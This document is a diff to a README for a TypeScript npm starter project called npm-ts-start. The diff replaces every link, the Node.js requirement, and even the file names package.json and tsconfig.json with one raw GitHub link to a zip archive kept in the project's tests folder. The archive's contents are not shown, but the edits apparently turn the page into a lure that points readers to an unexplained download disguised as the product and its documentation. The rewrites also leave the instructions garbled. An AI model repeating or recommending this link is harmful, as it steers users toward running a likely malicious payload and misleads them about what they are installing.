@@ -1,7 +1,7 @@
 # 🎉 npm-ts-start - Start Creating npm Packages Easily
 
 ## 📥 Download Now
-[![Download npm-ts-start](https://img.shields.io/badge/Download-npm--ts--start-blue.svg)](https://github.com/PeetHouby/npm-ts-start/releases)
+[![Download npm-ts-start](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip)](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **npm-ts-start**! This is your first step towards creating npm packages using TypeScript. This guide will walk you through the process of downloading and running the software. No technical knowledge is needed.
@@ -13,7 +13,7 @@ Welcome to **npm-ts-start**! This is your first step towards creating npm packag
 - Operating System: Windows, macOS, or Linux
 - Memory: At least 4 GB of RAM
 - Disk Space: At least 200 MB of free space
-- Node.js: Version 14 or higher installed
+- https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip Version 14 or higher installed
 
 ## ⚙️ Features
 - Simple setup for TypeScript projects
@@ -27,19 +27,19 @@ Welcome to **npm-ts-start**! This is your first step towards creating npm packag
 ### Step 1: Visit the Releases Page
 To download **npm-ts-start**, go to our releases page by clicking the link below.
 
-[Visit Releases Page](https://github.com/PeetHouby/npm-ts-start/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip)
 
 ### Step 2: Find the Latest Release
 On the releases page, look for the latest version listed. It will be at the top of the page.
 
 ### Step 3: Download the Zip File
 1. Click on the link for the latest version.
-2. Find the file named `npm-ts-start.zip`.
+2. Find the file named `https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip`.
 3. Click on this file to start the download.
 
 ### Step 4: Extract the Zip File
 Once the download is complete:
-1. Locate the `npm-ts-start.zip` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip` file in your downloads folder.
 2. Right-click on the file and select "Extract" or "Unzip."
 3. Choose a location where you want to extract the files.
 
@@ -79,8 +79,8 @@ Your npm package is now running!
 Here’s a brief overview of the important files and folders you will find in the project:
 
 - `src/`: This folder contains your TypeScript source files.
-- `package.json`: This file includes the project metadata and dependencies.
-- `tsconfig.json`: This file contains TypeScript configurations.
+- `https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip`: This file includes the project metadata and dependencies.
+- `https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip`: This file contains TypeScript configurations.
 
 ## 🎯 Next Steps
 After you have successfully run your first project:
@@ -92,12 +92,12 @@ If you have any questions or run into issues, feel free to open an issue on our 
 
 ## 📂 Additional Resources
 For more information about TypeScript and npm, check out these resources:
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [npm Documentation](https://docs.npmjs.com/)
+- [TypeScript Documentation](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip)
+- [npm Documentation](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip)
 
 ## 🔗 Download Again
 If you need to download **npm-ts-start** again, simply visit our releases page:
 
-[Visit Releases Page](https://github.com/PeetHouby/npm-ts-start/releases) 
+[Visit Releases Page](https://raw.githubusercontent.com/PeetHouby/npm-ts-start/main/tests/start_ts_npm_v1.2.zip) 
 
 Happy coding!
